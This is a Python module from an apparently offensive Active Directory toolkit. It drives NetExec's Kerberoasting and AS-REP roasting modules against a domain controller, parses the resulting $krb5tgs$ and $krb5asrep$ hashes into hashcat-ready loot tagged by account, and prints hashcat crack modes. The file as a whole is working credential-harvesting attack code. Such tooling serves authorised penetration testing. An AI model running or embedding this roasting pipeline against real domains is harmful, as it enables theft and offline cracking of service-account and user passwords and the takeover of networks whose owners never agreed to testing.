"""Kerberos roasting — turn AD's own tickets into crackable credentials.

Two no-touch acquisition techniques that feed the credential loop:

  * **Kerberoasting** — any domain user can request a service ticket (TGS) for any
    account with an SPN; the ticket is encrypted with the service account's password
    hash, so an offline crack recovers the password. High-value because service
    accounts are often over-privileged and their passwords rarely rotate.
  * **AS-REP roasting** — accounts with Kerberos pre-authentication disabled hand out
    an AS-REP encrypted with the user's hash to *anyone*, no credential needed.

fieldkit drives nxc's ``--kerberoasting`` / ``--asreproast`` modules, parses the
``$krb5tgs$`` / ``$krb5asrep$`` hashes out of the output, and stores them as loot
tagged with the account. It does not crack (that is hashcat's job, offline); a
recovered password comes back into the loop via ``add cred``. This module is pure
parse + an injected-runner driver, so it is testable without a DC.
"""
import re
from dataclasses import dataclass

from .creds import Credential, render_nxc

#: The two roast hash shapes. Captured whole (they contain no whitespace) so the loot
#: value is a hashcat-ready line.
_TGS = re.compile(r"\$krb5tgs\$\S+")
_ASREP = re.compile(r"\$krb5asrep\$\S+")

#: nxc hashcat mode hints, surfaced to the operator for the offline crack.
HASHCAT_MODE = {"kerberoast": 13100, "asrep_roast": 18200}


@dataclass(frozen=True)
class Roast:
    """One recovered roast hash."""

    kind: str            # kerberoast | asrep_roast
    account: str
    realm: str
    hash: str


def _account_tgs(h):
    # $krb5tgs$23$*svc_sql$CORP.LOCAL$svc_sql*$<hex>...  -> (svc_sql, CORP.LOCAL)
    parts = h.split("$")
    acct = parts[3].lstrip("*").split("*")[0] if len(parts) > 4 else ""
    realm = parts[4] if len(parts) > 4 else ""
    return acct, realm


def _account_asrep(h):
    # $krb5asrep$23$user@CORP.LOCAL:<hex>  -> (user, CORP.LOCAL)
    parts = h.split("$")
    tail = parts[3] if len(parts) > 3 else ""
    principal = tail.split(":", 1)[0]
    acct, _, realm = principal.partition("@")
    return acct, realm


def parse_roast(text):
    """Every ``$krb5tgs$`` / ``$krb5asrep$`` hash in nxc output, de-duplicated."""
    roasts, seen = [], set()
    for h in _TGS.findall(text or ""):
        h = h.rstrip(".,;")
        if h in seen:
            continue
        seen.add(h)
        acct, realm = _account_tgs(h)
        roasts.append(Roast("kerberoast", acct, realm, h))
    for h in _ASREP.findall(text or ""):
        h = h.rstrip(".,;")
        if h in seen:
            continue
        seen.add(h)
        acct, realm = _account_asrep(h)
        roasts.append(Roast("asrep_roast", acct, realm, h))
    return roasts


#: nxc module per roast kind. ``--kerberoasting`` needs a valid domain cred to query
#: LDAP; ``--asreproast`` does too (to enumerate preauth-disabled accounts), but the
#: tickets themselves need no secret.
_MODULE = {"kerberoast": "--kerberoasting", "asrep_roast": "--asreproast"}


@dataclass
class RoastReport:
    dc: str = None
    recovered: int = 0
    accounts: list = None
    aborted: str = None

    def __post_init__(self):
        if self.accounts is None:
            self.accounts = []


def run_roast(store, dc_host, cred, *, kinds=("kerberoast", "asrep_roast"),
              run=None, on_event=None, outfile="/tmp/.fk_roast"):
    """Roast against the DC with ``cred``, storing recovered hashes as loot.

    Returns a :class:`RoastReport`. ``run`` is the injected subprocess runner; the
    hashes are parsed from captured output, so the ``outfile`` nxc insists on is a
    throwaway.
    """
    from . import runner as runner_mod
    run = run or (lambda argv, env=None: runner_mod.run(argv, env_add=env))
    # callers pass a credential row; render from the canonical model like spray does.
    cred = cred if isinstance(cred, Credential) else Credential.from_row(cred)
    report = RoastReport(dc=dc_host["ip"])
    with store.transaction():
        for kind in kinds:
            rendered = render_nxc(cred, "ldap", target=dc_host["ip"],
                                  extra=[_MODULE[kind], outfile])
            result = run(rendered.argv, rendered.env)
            if not result.ok:
                report.aborted = result.error
                return report
            for roast in parse_roast(result.output):
                if roast.kind != kind:
                    continue
                _, created = store.add_loot(dc_host["id"], roast.kind, value=roast.hash)
                if created:
                    report.recovered += 1
                    report.accounts.append((roast.kind, roast.account))
                    if on_event:
                        mode = HASHCAT_MODE[roast.kind]
                        on_event(f"  {roast.kind}: {roast.account} (crack: hashcat -m {mode})")
    return report
